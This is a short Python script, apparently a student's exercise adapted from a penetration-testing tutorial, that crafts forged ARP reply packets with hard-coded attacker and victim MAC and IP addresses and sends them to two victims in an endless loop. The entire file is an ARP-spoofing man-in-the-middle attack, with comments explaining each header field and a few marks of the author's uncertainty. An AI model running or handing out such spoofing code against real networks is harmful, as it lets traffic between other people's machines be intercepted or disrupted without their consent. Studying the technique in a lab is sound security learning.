# ARP Spoofing Program
# Written by Ray Loerke
# Adapted from https://www.tutorialspoint.com/python_penetration_testing/python_penetration_testing_arp_spoofing.htm

import socket

# Not sure if these are necessary?
# import struct
# import binascii

# The first parameter determines the packet interface. Use PF_PACKET for Linux and AF_INET for Windows
# The third parameter determines the protocol we want to use. 0x0800 is IP
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))

# I am not sure which interface should be used. It seems like you would need two, one for each target?
s.bind(("eth0", socket.htons(0x0800)))

# MAC addresses of involved machines. I might set these up as something the user can input
attackmac = '\x00\x0c\x29\x4f\x8e\76'
victim1mac = '\x00\x0c\x29\x2E\x84\x5A'
victim2mac = '\x00\x50\x56\xC0\x00\x28'

# This code identifies that we are using ARP protocol
code = '\x08\x06'

# Ethernet packets are built for each target using MAC addresses and the ARP code
ethernet1 = victim1mac + attackmac + code
ethernet2 = victim2mac + attackmac + code

# Then the ARP headers are crafted
htype = '\x00\x01'  # Hardware type: Ethernet is 0x0001
prototype = '\x08\x00'  # Protocol type: IPv4 is 0x0800
hsize = '\x06'  # Hardware length: Ethernet address length is 0x06 octets for the 48 bit MAC address
psize = '\x04'  # Protocol length: IPv4 is 0x04
opcode = '\x00\x02'  # Operation code: is this a REQUEST (0x0001) or REPLY (0x0002)

# IP addresses of involved machines.  I might set these up as something the user can input
victim1_ip = '192.168.43.85'
victim2_ip = '192.168.43.131'

# Convert IP addresses into Hex
victim1ip = socket.inet_aton(victim1_ip)
victim2ip = socket.inet_aton(victim2_ip)

# The full ARP packets are put together
# First we have the Ethernet header, then the ARP header fields, then the sender hardware address,
# false sender IP address, target hardware address, and target IP address
victim1_ARP = ethernet1 + htype + prototype + hsize + psize + opcode + attackmac + victim2ip + victim1mac + victim1ip
victim2_ARP = ethernet2 + htype + prototype + hsize + psize + opcode + attackmac + victim1ip + victim2mac + victim2ip

# Continuously send the forged ARP packets to the two targets
while 1:
    s.send(victim1_ARP)
    s.send(victim2_ARP)

